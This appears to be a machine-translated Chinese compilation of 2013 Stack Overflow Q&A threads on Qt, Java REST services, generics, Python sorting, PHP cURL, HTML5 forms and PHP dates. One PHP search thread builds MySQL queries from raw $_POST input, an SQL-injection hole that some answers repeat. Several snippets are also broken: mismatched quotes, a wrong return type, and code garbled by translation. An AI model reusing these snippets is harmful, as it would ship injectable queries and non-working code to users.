这里的另一个问题是：窗口不仅会根据其在屏幕上的位置进行最大化/最小化，还会根据窗口的大部分位置进行最大化/最小化。如果 80% 的窗口在屏幕 1 上，但左上角在屏幕 2 上，则最大化的窗口将在屏幕 1 上。

不过，你的想法是最好的。经过一个多小时的谷歌（使用 QT5），我现在使用：

写设置：

```
settings.setValue("pos", pos());
if(!isMaximized())
    settings.setValue("size", size());
settings.setValue("maximized", isMaximized()); 
```

读取设置：

```
if(settings.contains("pos"))
    move(settings.value("pos").toPoint());
if(settings.contains("size"))
    resize(settings.value("size").toSize());

if(settings.value("maximized").toBool())
    setWindowState(windowState() | Qt::WindowMaximized); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:26:33.683

我认为您遇到的问题来自于 QWidget 可读和可设置的许多几何形状和大小。具体来说，您可能想查看 normalGeometry、height、width、maximumHeight、maximumWidth、minimumHeight、minimumWidth 等之间的差异。

# java - 如果 id 不存在，则 RestFul WebServices 响应错误代码

> ID：15111789
> 
> 赞同：0
> 
> 时间：2013-02-27T12:09:38.877
> 
> 标签：java, web-services, rest

我正在开发提供 JSON 响应的 Restful Web 服务

```
@GET
@Produces("application/json")
public Site getSite() {
    return (Site)siteFacade.find(Integer.parseInt(id));

} 
```

这是我通过 id 获取站点信息的方法

当输入的 id=11 没有数据时，我得到以下输出

```
GET Request Failed Request Failed --> Status: (204) Response: {

} 
```

现在我希望该响应字段包含错误代码 = 204 的正确消息，例如“无效请求”或“id 不存在”，需要确切更改，请帮助我们

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:18:23.403

这个怎么样。

通常，如果您请求某些东西，但没有找到，您会给出 404 来表示（这也是 RESTful 精神）：

```
@GET
@Produces("application/json")
public Site getSite() {
  Site site = (Site) siteFacade.find(Integer.parseInt(id));
  if (site == null) {
    return Response.status(Response.Status.NOT_FOUND).build();
  }
  return site;
} 
```

如果您需要在响应正文中添加一条消息，我认为可以添加如下内容：

```
@GET
@Produces("application/json")
public Site getSite() {
  Site site = (Site) siteFacade.find(Integer.parseInt(id));
  if (site == null) {
    return Response.status(Response.Status.NOT_FOUND).entity("No item with this id found").build();
  }
  return site;
} 
```

# java - 如何使用 java DOM 添加额外的 DTD 声明

> ID：15111792
> 
> 赞同：1
> 
> 时间：2013-02-27T12:09:44.293
> 
> 标签：java, dom, dtd, xml

我的程序应该读取一个 XML 文档，对其进行编辑，然后再次导出它，但是当它这样做时，它会在没有我最初包含的声明的情况下导出它：

```
<!DOCTYPE touchégg [
<!ELEMENT touchégg (application)*>
<!ELEMENT application (gesture)>
<!ELEMENT gesture (action)>
<!ELEMENT action (#PCDATA)>
<!ATTLIST action type CDATA #IMPLIED>
<!ATTLIST gesture 
    id ID #IMPLIED
    type CDATA #IMPLIED
    fingers CDATA #IMPLIED
    direction CDATA #IMPLIED>
]> 
```

如何将其添加到我的文档顶部？

# c++ - 什么是_WIN32_WINNT，它是如何工作的？

> ID：15111799
> 
> 赞同：8
> 
> 时间：2013-02-27T12:09:55.733
> 
> 标签：c++, winapi, windows-7

**编辑 2：**好的，所以我更改为 Orwell DevC++，其中包含包含*#define KEY_WOW64_64KEY 0x0100*的“winnt.h”，但它仍然无法正常工作。*（请参阅编辑 1:)*

**编辑 1：**我查看了 CodeBlock 和 DevC++ 附带的“winnt.h”，而 DevC++ 缺少以下几行：

```
#if (_WIN32_WINNT >= 0x0502)
#define KEY_WOW64_64KEY 0x0100
#define KEY_WOW64_32KEY 0x0200
#endif 
```

并且将上面的代码放在 DevC++ 的 wint.h 中是行不通的。

* * *

**原始帖子：** 我有一个 32 位应用程序（在 DevC++ 和 Windows 7 64 位中开发），它读取 64 位应用程序的注册表作为其任务之一，所以我试图在 RegOpenKeyEx 中使用“KEY_WOW64_64KEY”标志，并发现很少有关于如何使用的帖子它与 _WIN32_WINNT ：[*这个*](https://stackoverflow.com/questions/12528099/error-with-regopenkeyex)和[*这个*](https://stackoverflow.com/questions/5247862/error-with-regopenkeyex)

当我在 CodeBlock 项目（一个测试项目）中使用它时，它就像魅力一样，但相同的代码不适用于 DevC++，我现在无法将它移植到代码块，因为代码块存在其他问题。

我如何使它与 DevC++ 一起工作？

谢谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-02-27T12:15:07.073

它定义了要使用的 windows 头文件的版本。它必须在你面前宣布`#include <Windows.h>`。

如果您要修改它，您可能应该设置一些其他类似的变量：

[MSDN 使用 Windows 标头](http://msdn.microsoft.com/en-us/library/windows/desktop/aa383745%28v=vs.85%29.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:16:51.303

1.  `_WIN32_WINNT`是一个预处理器标记，被使用的`(0x0601)`地方替换`_WIN32_WINNT`。预处理器只是扫描整个文件并用`_WIN32_WINNT`找到的`(0x0601)`任何地方替换。

很有可能，可能会有`ifdef`预处理器守卫来启用/禁用预处理器常量。喜欢：

```
#ifdef _WIN32_WINNT
#define KEY32 32
#endif 
```

那里，`KEY32`只会定义**IF** `_WIN32_WINNT`被定义。

1.  它已经适用于 DevC++。

# php - 在 php curl 中发送 cookie 值

> ID：15111800
> 
> 赞同：0
> 
> 时间：2013-02-27T12:09:57.673
> 
> 标签：php

我已经使用 curl 登录到该站点，当时我将 cookie 保存在某个文件“abc.txt”中。

现在继续下一步，我想阅读我保存在“abc.txt”中的 cookie，并将它们发送到同一站点的其他页面。

我怎么能在 PHP 中做到这一点。请提出建议。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:12:26.097

您需要`CURLOPT_COOKIEFILE`在 cURL 资源中设置选项：

```
$cookie_file = 'abc.txt';
curl_setopt($curl, CURLOPT_COOKIEFILE, $cookie_file); 
```

从[文档](http://www.php.net/manual/en/function.curl-setopt.php)中：

> **CURLOPT_COOKIEFILE**
> 包含 cookie 数据的文件的名称。cookie 文件可以是 Netscape 格式，或者只是转储到文件中的普通 HTTP 样式的标头。如果名称为空字符串，则不加载任何 cookie，但仍启用 cookie 处理。

如果您希望 cURL 在完成 URL 处理后将 cookie 转储到文件中，则需要设置`CURLOPT_COOKIEJAR`选项：

```
curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie_file); 
```

> **CURLOPT_COOKIEJAR**
> 当句柄关闭时保存所有内部 cookie 的文件的名称，例如在调用`curl_close`.

# java - 演员表 列出

> ID：15111811
> 
> 赞同：5
> 
> 时间：2013-02-27T12:10:28.173
> 
> 标签：java, list, collections, casting

我有一个名为“Father”的简单 POJO 和另一个名为“Son”的 POJO，它扩展了“Father”，这是最简单的类继承示例。

现在我有一个`List<Son>`，我需要将它转换为一个`List<Father>`.

我能怎么做？

**编辑**

对不起命名不好，我没有解释自己。**Person**和**Employee**会是一个更好的例子。或者**Product**和**Computer**也是。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:19:11.917

如上所述，您不能在此处使用演员表*。您可以编写一个小的辅助方法来进行转换（即复制）：

```
private static List<Father> getListFather(List<? extends Father> list) {
    return new ArrayList<> (list);
} 
```

[*实际上你可以 - cf另一个答案：`List<Father> listFather = (List<Father>) (List<? extends Father>) listSons;`]

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T12:19:29.073

假设您可以通过强制转换来做到这一点，这将导致以下问题：

```
List<Son> ls = ...;
List<Father> lf = (List<Son>) ls;
lf.add(new Father()); 
```

两者`ls`和都`lf`指向同一个实例，因此您刚刚将一个`Father`对象添加到 Sons 列表中。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-27T12:21:22.510

2条建议：

有一个接口，比如说`Person`，`Father`（因此`Son`）实现。两者都用`List<Person>`。

使用集合构造函数创建一个`new List<Father>`，例如`List<Father> fathers = new ArrayList<Father>(sons);`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-27T12:20:18.733

这似乎有效：

```
static class Father {};
static class Son extends Father{};

public void test() {
  List<Son> sons = new ArrayList<>();
  // Not allowed.
  //List<Father> sons2 = (List<Father>)sons;
  // Two step.
  List<? extends Father> sons3 = sons;
  List<Father> sons4 = (List<Father>)sons3;
  // Direct.
  List<Father> sons5 = (List<Father>)((List<? extends Father>)sons);
} 
```

# python - 列表列表中不同元素的不同顺序排序

> ID：15111815
> 
> 赞同：1
> 
> 时间：2013-02-27T12:10:37.123
> 
> 标签：python, list, sorting

我有一个列表列表，

> mylist = [['zzz', 100], ['sss', 100], ['555',100], ['222',100], ['333',90]]

这是一个基于使用以下函数的排序（降序）列表

> 排序（mylist，key=lambda x: (x[1],x[0]), reverse=True)

我想以这种方式排序，所以我得到以下顺序

> [['222',100], ['555',100], ['sss', 100], ['zzz', 100], ['333',90]]

即按`desc`分数 x[1] 排序，其中按`asc`值 x[0] 排序

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T12:15:11.577

你很亲密，很幸运。

幸运是因为：

您至少有一个数值，您可以取反以创建不同的订单

关闭是因为，

这就是你所缺少的

```
>>> mylist = [['zzz', 100], ['sss', 100], ['555',100], ['222',100], ['333',90]]
>>> sorted(mylist, key = lambda e: (-e[1], e[0]))
[['222', 100], ['555', 100], ['sss', 100], ['zzz', 100], ['333', 90]]
>>> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T12:15:33.810

如果您需要反转数字字段的顺序，这很容易，只需将其取反即可

```
>>> mylist = [['zzz', 100], ['sss', 100], ['555',100], ['222',100], ['333',90]]
>>> sorted(mylist, key=lambda x:(-x[1], x[0]))
[['222', 100], ['555', 100], ['sss', 100], ['zzz', 100], ['333', 90]] 
```

例如，如果您必须对两个字符串字段进行排序，一个升序和一个降序，那就[不太容易了](https://stackoverflow.com/a/15112082/174728)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-27T12:24:13.287

在不能使用否定的情况下，例如所有元素都是字符串，你可以创建一个比较函数，并使用`functools.cmp_to_key`它来将其转换为一个关键函数。

```
from functools import cmp_to_key
mylist = [['zzz', 100], ['sss', 100], ['555',100], ['222',100], ['222',90]]
def f(a, b):
    return cmp(a[0], b[0]) or -cmp(a[1], b[1])
sorted(mylist, key=cmp_to_key(f)) 
```

# php - 如何使用php匹配整个字符串

> ID：15111817
> 
> 赞同：-3
> 
> 时间：2013-02-27T12:10:40.643
> 
> 标签：php, preg-match

我有两个数组：

```
 $search = array('A/OPTION-1/z','/OPTION-2/','/OPTION-3/','/OPTION-4/','/OPTION-5/','/OPTION-6/','/OPTION-7/','/OPTION-8/',
            '/OPTION-9/','/OPTION-10/','/OPTION-11/','/OPTION-12/','/OPTION-13/','/OPTION-14/','/OPTION-15/','/OPTION-16/','/OPTION-17/',
            '/OPTION-18/','/OPTION-19/'); 
```

并想替换为：

```
$replace = array('<b class="option" id="1" >OPTION 1</b><hr>',
            '<b class="option" id="2">OPTION 2</b><hr>',
            '<b class="option" id="3">OPTION 3</b><hr>',
            '<b class="option" id="4">OPTION 4</b><hr>',
            '<b class="option" id="5">OPTION 5</b><hr>',
            '<b class="option" id="6">OPTION 6</b><hr>',
            '<b class="option" id="7">OPTION 7</b><hr>',
            '<b class="option" id="8">OPTION 8</b><hr>',
            '<b class="option" id="9">OPTION 9</b><hr>',
            '<b class="option" id="10">OPTION 10</b><hr>',
            '<b class="option" id="11">OPTION 11</b><hr>',
            '<b class="option" id="12">OPTION 12</b><hr>',
            '<b class="option" id="13">OPTION 13</b><hr>',
            '<b class="option" id="14">OPTION 14</b><hr>',
            '<b class="option" id="15">OPTION 15</b><hr>',
            '<b class="option" id="16">OPTION 16</b><hr>',
            '<b class="option" id="17">OPTION 17</b><hr>',
            '<b class="option" id="18">OPTION 18</b><hr>',
            '<b class="option" id="19">OPTION 19</b><hr>'); 
```

回应是：

```
 OPTION-1 AX
 OPTION-11 AX
 OPTION-12 AX
 OPTION-13 AX 
```

问题是当我替换 OPTION-1 时它工作正常，但是当我替换 OPTION-11 时，它将 OPTION-11 替换为 OPTION-1，它应该是 OPTION-11。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:16:18.733

您可以使用此一般规则来捕获任何`OPTION X`字符串并替换它们：

```
preg_replace("/OPTION (\d+)/i", "<b class="option" id="$1">OPTION $1</b><hr>", $subject_string); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:14:56.657

尝试更改“替换”的顺序。首先运行替换具有更大数字的选项。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:17:42.507

我打算也建议改变数组的顺序

您可以使用[http://php.net/manual/en/function.array-reverse.php](http://php.net/manual/en/function.array-reverse.php)来执行此操作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T12:20:09.843

使用单词边界（即。`\b`）：

```
$search = array('/\bOPTION-1\b/', '/\bOPTION-2\b/', ... ); 
```

# html - 如何在计算 css 之前暂停浏览器渲染？

> ID：15111819
> 
> 赞同：2
> 
> 时间：2013-02-27T12:10:44.157
> 
> 标签：html, dom

我想强制浏览器等到所有 css 都被计算出来后再渲染页面。

我的目标是避免在纯 html 渲染和 css 渲染之间出现“视觉故障”效果（在[此处提到）。](https://stackoverflow.com/questions/15110823/why-would-a-web-page-render-plain-html-before-taking-css-into-account)我的目标也是简单地了解我是否以及如何在浏览器上获得这种级别的控制。

这可能吗，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:22:23.547

我认为在避免所谓的“故障”的标准意义上，您无法做任何事情。也许有软件可以以某种方式为您的文件提供服务，但即使这是可能的，那是多么的矫枉过正？！

如今，大多数浏览器都会以如此快的速度加载 HTML 和 CSS，您甚至都不会注意到它。

如果您遇到故障问题，则可能与之后下载到页面的资产有关，实际上与 CSS 本身无关。

想想像图像、脚本甚至网络字体这样的资产。这些也需要加载。如果你的页面设计是依靠这些资产以某种方式实现布局，那么它当然会产生轻微的故障效果，因为它需要加载。

我认为几乎不可能计算 CSS 何时加载，因为这是在流程的“客户端”端完成的。您无法真正预期人们的浏览器和互联网速度到准备就绪时可以提供服务的程度。

如果您遇到字体渲染（跳跃）故障，请查看这篇文章： http: [//paulirish.com/2009/fighting-the-font-face-fout/](http://paulirish.com/2009/fighting-the-font-face-fout/)

如果与此无关，我强烈建议您重新考虑您的页面是如何组合在一起的。

希望这在某种程度上有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-01-06T04:41:43.450

一个老问题，但是当我试图弄清楚如何防止“页面闪烁”时发现它 - 在 CSS 启动之前，您会看到没有完全应用 CSS 的 HTML 内容。

这里提到了几种技术[https://www.sitepoint.com/critical-rendering-path-css-fast-loading-website/](https://www.sitepoint.com/critical-rendering-path-css-fast-loading-website/)。这段代码对我有用，可以防止“闪烁”：

```
<link rel="preload" href="mystylesheet.css" as="style" onload="this.rel='stylesheet'">
<!-- for browsers without JavaScript enabled -->
<noscript><link rel="stylesheet" href="mystylesheet.css">
</noscript> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:22:00.087

最好的建议是在页面头部加载 CSS 文件，并在关闭正文之前加载 JS。

如果您已经这样做了，请查看开发人员工具（在 Chrome 中）的网络选项卡，看看网络是否延迟了您的 CSS 文件的交付。

# ruby-on-rails-3 - Twitter API，发送图片 url，ruby

> ID：15111825
> 
> 赞同：1
> 
> 时间：2013-02-27T12:10:54.680
> 
> 标签：ruby-on-rails-3, twitter

我在 Rails 中为 Twitter API 使用 twitter gem。一切正常，但我无法将图片 url 和我的帖子链接到 twitter 网站。这是我的代码：

在模型中：-

```
 def twitter
   @twitter ||= Twitter::Client.new(oauth_token: token, oauth_token_secret: secret )
 end

def post_to_twitter(user)
  begin
    @twitter = user.authentications.find_by_provider('twitter')
    if @twitter.present?
      twitter = @twitter.twitter
      twitter.update(self.title)
    end
  rescue Exception => e
    Rails.logger.debug e.message
  end
end 
```

在控制器中：-

```
def create      
  @post = Post.new(params[:post])
  @post.user_id = current_user.id
  respond_to do |format|
    if @post.save         
      @post.post_to_twitter current_user        
      format.js { render :layout => false }
  else        
    @message = "Please enter content"
    format.js { render :layout => false }
  end
end 
```

结尾

通过使用： twitter.update(self.title)...我的应用程序的标题转到 twitter 网站，但我怎样才能发送与标题相同的任何链接和图像 url？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:52:15.013

使用 AccessToken发出常规**POST 请求以发布链接和 urls-** [oauth rdoc](http://oauth.rubyforge.org/rdoc/classes/OAuth/AccessToken.html)。

[使用 oauth ruby​​ gem](https://dev.twitter.com/docs/auth/oauth/single-user-with-examples#ruby)获取访问令牌。

[掌握 Ruby OAuth gem 和 Twitter API 的](http://michaelhallsmoore.com/blog/Getting-to-grips-with-the-Ruby-OAuth-gem-and-the-Twitter-API)全部过程。

# jquery - 当我在页面中使用 jquery 时，为什么我的 html5 不起作用？

> ID：15111833
> 
> 赞同：0
> 
> 时间：2013-02-27T12:11:15.623
> 
> 标签：jquery, html

这是我的代码。我正在尝试使用 html5 验证表单。

```
<!DOCTYPE HTML>
<html>
<head>
    <title>Info</title>
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <script type="text/javascript" src="js/jquery-1.8.3.js"></script>
</head>
<body>
<div class="body" style="width:500px; margin:auto;">

    <div class="mainform" style="display:block;">
            Step 1 :
            <form id="info" action="" method="post">
    <fieldset> 
        <?php /*?><legend>Your Details</legend><?php */?>
        <ol>
            <li>
                <label for="name">Name</label>
                <input id="name" name="name" type="text" placeholder="Enter Full Name" required autofocus />
            </li>
            <li>
                <label for="email">Email</label>
                <input id="email" name="email" type="email" placeholder="example@domain.com" required />
            </li>

            <li>
                <label for="address">Address</label>
                <textarea id="address" name="address" rows=5 required /></textarea>
            </li>

            <li>
                <label for="zip">Zip Code</label>
                <select name="zip" id="zip" required>
                    <option value="">Select Zip Code</option>
                    <option value="4333">4333</option>
                    <option value="4334">4334</option>
                    <option value="4335">4335</option>
                    <option value="4336">4336</option>
                    <option value="4337">4337</option>
                </select>
            </li>

            <li>
                <label for="gender">Gender</label>
                <select name="gender" id="gender" required>
                    <option value="">Select Gender</option>
                    <option value="m">Male</option>
                    <option value="f">Female</option>
                </select>
            </li>

        </ol>
    </fieldset>
    <input id="sub" type="submit" name="sub" value="submit" />
    <input type="reset" name="reset" value="reset" />
</form>
    </div>

    <div class="secondfrom" style="margin-top:20px; display:none;">
            Step 2 :
            <form action="" method="post" id="info">
            Please Enter Your Code<br />
            <input type="text" name="code" class="code" placeholder="Enter Your Code" /><br />
            <input id="codesubmit" type="submit" name="codesubmit" value="submit" />
            <input id="codeskip" type="button" name="skip" value="skip" />
            </form>
    </div>
    <script type="text/javascript">
    //$(document).ready(function() {

    //});
    </script>
    <div class="thirdfrom" style="margin-top:20px; display:none;">
            <form action="" method="post" id="info">
            Congratulation.Your code is successfully send<br />

            <input id="congratsub" type="submit" name="confirmsubmit" value="Proceed" />
            </form>
    </div>
</div>

</body>
</html> 
```

它按我的预期工作，我的意思是 html5 验证。但是每当我将此 jquery 代码添加到页面时，html5 验证都不起作用。怎么了 ？

```
<script type="text/javascript">
    $(document).ready(function() {
      $("#sub").click(function() { 
         $('.mainform').hide(); 
          $('.thirdfrom').hide(); 
         $('.secondfrom').show(); 
        });

        $("#codesubmit").click(function() { 
         $('.mainform').hide(); 
         $('.secondfrom').hide(); 
         $('.thirdfrom').show();
         return false;

        });
    });     
    </script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:14:55.830

在`click`您附加到`codesubmit`提交按钮的处理程序中，您正在执行`return false`. 这会阻止按钮的默认操作，即（尝试）提交表单。由于您没有尝试提交表单，因此浏览器没有进行验证。

如果您想阻止提交但仍然进行有效性检查，您可以`checkValidity`在某些浏览器上调用表单的 DOM 元素。

# php - 搜索 PHP MYSQL 查询

> ID：15111835
> 
> 赞同：0
> 
> 时间：2013-02-27T12:11:16.020
> 
> 标签：php, search

我正在尝试制作一个搜索程序。我有三个表`postivewords`：`negativewords`和`recommendationwords`。这些表仅由 word_id 和单词组成。我如何在查询中做到这一点？这就是我到目前为止所拥有的。如果我错了，请纠正我。

```
if(isset($_POST['searchword']))    
{        
    $word = $_POST['search'];            
    $search1= mysql_fetch_array(mysql_query("SELECT * FROM positivethesaurus where word like '%$word%'"));
    $search2= mysql_fetch_array(mysql_query("SELECT * FROM negativethesaurus where word like '%$word%'"));    
    $search3= mysql_fetch_array(mysql_query("SELECT * FROM recommendationthesaurus where word like '%$word%'"));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:17:30.047

```
select * from negativethesaurus, positivethesaurus,recomendationthesaurus where negativethesaurus.word like '%"word%' or positivethesaurus.word like '%word%' or recomendationthesaurus.word like '%word%'; 
```

这可能不是最快的方法（您将使用索引和自由文本），但它只会在一个查询上失败。

哦，是的，据说这个查询容易受到 sql 注入攻击。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:18:54.193

也做 mysql_escape_string 以避免sql注入

```
 $word = $_POST['search'];
  $word = mysql_escape_string($word); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:18:45.173

```
$query = SELECT positivethesaurus .*,negativethesaurus.*,recommendationthesaurus.*   FROM positivethesaurus,negativethesaurus,recommendationthesaurus where positivethesaurus.word like '%$word%' OR negativethesaurus.word like '%$word%' OR recommendationthesaurus.word like '%$word%'"; 
```

**更新** 如果你想检查是否没有找到结果然后这样做

```
<?php
 $query = mysql_query("Your Query Here");
 $rowCount = mysql_num_rows($query);
 if($rowCount>0) {
   // DO YOur STUFF IF RESULTS FOUND
 } else {
  echo "No Results Found";
 }
?> 
```

**请注意不要使用 mysql_* 函数**

希望这有效。虽然没有测试。如果您发现任何问题，请告诉我

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-02-27T12:20:13.050

1) 选择尊重的列而不是 select * from 2) 避免 sql 注入

# php - 在 PHP/MySQL 中计算和存储未来的时间和日期

> ID：15111846
> 
> 赞同：0
> 
> 时间：2013-02-27T12:11:45.547
> 
> 标签：php, mysql, date, datetime, time

我需要为我的用户提供一种选择未来几天（包括今天）上午 11 点和下午 4 点时间段的方法，共有 8 个选项。当然，如果今天已经过了上午 11 点或下午 4 点，那么我不应该向他们展示过期选项。

因此，例如，如果现在是 2 月 28 日中午，那么我需要向用户显示以下 8 个选项：

```
28-Feb-13 at 4pm 
01-Mar-13 at 11am 
01-Mar-13 at 4pm 
02-Mar-13 at 11am 
02-Mar-13 at 4pm 
03-Mar-13 at 11am 
03-Mar-13 at 4pm 
04-Mar-13 at 11am 
```

此外，我需要一种将这些选项存储在 MySQL 中的方法，以便我现在可以将他们选择的日期/时间与他们的注册信息一起保存到数据库中。

这听起来很容易用语言解释，但我很难弄清楚如何用 PHP 进行编程。

我将如何使用`DateTime()`课程来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:33:21.980

请尝试以下代码，我会将 DATETIME 存储在数据库中：您可以根据需要进行优化，它应该为您提供基本的逻辑概念：

```
<?php
    $end_date = mktime(0, 0, 0, date("m")  , date("d")+4, date("Y"));
    $cnt = 0;
    $day = 0;

    $current_hour = date("H");
    // To test with various values, uncomment below line and assign any hour
    // $current_hour = "12";

    if($current_hour < 11)
    {
        $day = 0;
        $ts =  mktime(11, 0, 0, date("m")  , date("d"), date("Y"));
        echo "<br>".date("Y-m-d H:i:s",$ts);
        $ts =  mktime(16, 0, 0, date("m")  , date("d"), date("Y"));
        echo "<br>".date("Y-m-d H:i:s",$ts);
        $cnt = 2;
        $day = $day + 1;
    }
    elseif($current_hour < 16)
    {
        $day = 0;
        $ts =  mktime(16, 0, 0, date("m")  , date("d")+$day, date("Y"));
        echo "<br>".date("Y-m-d H:i:s",$ts);
        $cnt = 1;
        $day = $day + 1;
    }
    elseif($current_hour >= 16)
    {

        $day = $day + 1;
    }

    while($cnt <= 8)
    {
        $ts =  mktime(11, 0, 0, date("m")  , date("d")+$day, date("Y"));
        echo "<br>".date("Y-m-d H:i:s",$ts);
        $cnt = $cnt + 1;
        if($cnt >=8) break;

        $ts =  mktime(16, 0, 0, date("m")  , date("d")+$day, date("Y"));
        echo "<br>".date("Y-m-d H:i:s",$ts);    
        $cnt = $cnt + 1;
        $day = $day + 1;
        if($cnt >=8) break;
    }

    ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:34:04.177

您只需要创建一个“现在”的日期时间，然后检查您是否在上午 11 点之前，然后决定将您的时间移动到上午 11 点或下午 4 点，然后增加以检索您的 8 个值。

这是一段可以处理这些东西的代码：

```
// create a "now" date time
$now = new DateTime();

// create a "now at 11am" date time
$nowAt11am = new DateTime();
$nowAt11am->setTime(11, 0, 0);

// Compare the interval between now and now at 11am
$interval = $now->diff($nowAt11am);

// Initialize the increment even/odd
$incementEvenOdd = 0;

// Check interval
if ($interval->invert == 1)
{
    // $interval < 0 => we are before $nowAt11am, set to 11 am
    $now = $nowAt11am;
    $incementEvenOdd = 0;
}
else
{
    // $interval > 0 => we are after $nowAt11am, set to 4 pm
    $now->setTime(16, 0, 0);
    $incementEvenOdd = 1;
}

$dayAndHours = array();
$dayAndHours[] = $now->format("your_desire_format");

// Loop and add the next 7 dates
for($i = 0 ; $i < 7 ; $i++)
{
    // Handle the delay between 11 am and 4 pm
    // 11am -> 4pm = + 5h
    // 4pm -> 11am = + 19h

    if ($incementEvenOdd % 2 == 0)
        $now->add(DateInterval::createFromDateString('5 hours'));
    else
        $now->add(DateInterval::createFromDateString('19 hours'));

    // Appen the next value
    $dayAndHours[] = $now->format("your_desire_format");

    // Update increment
    $incrementEvenOdd++;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T13:06:23.183

```
<?php

$hours = array(11,16);
$outputCount = 8;

$now = new DateTime();
$t = clone $now;

$dates = array();
$i=0;

while (count($dates)<$outputCount) {
    $t->setTime($hours[++$i % count($hours)],0,0);
    if ($t>$now) {
        $dates[] = clone $t;
    }
    if ($t->format('G') == max($hours)) {
        $t->modify('+1 day');
    }
}

print_r($dates); 
```

# ios - 使用 BannerViewController 时没有 UITabBarItem 图像

> ID：15111848
> 
> 赞同：1
> 
> 时间：2013-02-27T12:11:47.383
> 
> 标签：ios, xcode, ios6, iad, uitabbaritem

我有一个针对 ios 6 的通用选项卡式应用程序，带有 4 个选项卡。几乎准备好发布了，我开始寻找支持 iAd 的最新和最好的方法。在查看了 Apple 的 iAdSuite 演示项目后，似乎使用 BannerViewController 来包装我的 4 个 UIViewController 是完美的解决方案。

而且它在正确显示 iAd 方面非常有效。

但是，自从进行更改后，我的标签栏不再显示图像/图标。我逐行浏览了 BannerViewController 代码，但看不到任何似乎覆盖图像设置的内容。

我所做的更改是：

1.  将 BannerViewController.h & .m 添加到我的项目中。
2.  #import <iAd/iAd.h> 在我的 4 个 UIViewController 中。
3.  修改设置我的选项卡视图控制器的 AppDelegate 代码，使其更改：

从

```
self.tabBarController = [[UITabBarController alloc] init];
self.tabBarController.delegate = self;
self.tabBarController.viewControllers = @[viewController1, viewController2, viewController3, viewController4]; 
```

到

```
self.tabBarController = [[UITabBarController alloc] init];
self.tabBarController.delegate = self;
self.tabBarController.viewControllers = @[
                [[BannerViewController alloc] initWithContentViewController:viewController1],
                [[BannerViewController alloc] initWithContentViewController:viewController2],
                [[BannerViewController alloc] initWithContentViewController:viewController3],
                [[BannerViewController alloc] initWithContentViewController:viewController4]
                 ]; 
```

在我的 4 个视图控制器中，我在 initWithNibName 方法中有以下代码（带有适当的标题和图像名称：

```
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        self.title = NSLocalizedString(@"Library", @"Library");
        self.tabBarItem.image = [UIImage imageNamed:@"96-book"];
    }
    return self;
} 
```

使用原始代码，标题和图像按预期工作。使用修改后的代码，我得到标题但没有图像，只有一个黑色按钮。有没有人遇到过这个？

请注意，我在 Apple 示例应用程序中进行了尝试，但也无法在其中显示图像，示例应用程序针对 iOS5，而我的应用程序针对 iOS6。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:37:26.180

所以我终于找到了一个解决方案，这要归功于这个有点相关的SO问题......

[iOS在UITabBar中更改UITabBarButton的框架](https://stackoverflow.com/questions/13936018/ios-change-frame-of-uitabbarbutton-in-uitabbar)

我从视图控制器中删除了图像设置代码，而是在将视图控制器分配给 UITabBar 之后将以下行添加到 AppDelegate

```
UITabBar *tabBar = self.tabBarController.tabBar;
[[tabBar.items objectAtIndex:0] setImage:[UIImage imageNamed:@"253-person"]];
[[tabBar.items objectAtIndex:1] setImage:[UIImage imageNamed:@"138-scales"]];
[[tabBar.items objectAtIndex:2] setImage:[UIImage imageNamed:@"85-trophy"]];
[[tabBar.items objectAtIndex:3] setImage:[UIImage imageNamed:@"96-book"]]; 
```

现在我的标签栏图像又回来了！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-20T19:28:52.190

我刚刚遇到了同样的问题。原因是封装了各个ViewController的BannerViewController没有通过访问tabBarItem，所以UITabBarController找不到自己需要的图标。

正确的解决方法是将其添加到 BannerViewController.m：

```
- (UITabBarItem *)tabBarItem {
  return _contentController.tabBarItem; 
} 
```

# database - 员工技能设计并将表的所有行添加到另一个表中

> ID：15111855
> 
> 赞同：0
> 
> 时间：2013-02-27T12:12:07.417
> 
> 标签：database, database-design

我正在尝试确定我的设计是否正确以及您如何查询/插入它。员工具有一组核心能力和特定于工作的能力。一个网站会要求对他们的核心能力进行评分，然后根据他们的工作类型要求一组特定的能力

到目前为止，我有一组代表员工、部门（即工作类型）、能力（核心能力、软件能力等）的表格。

部门：

```
Id
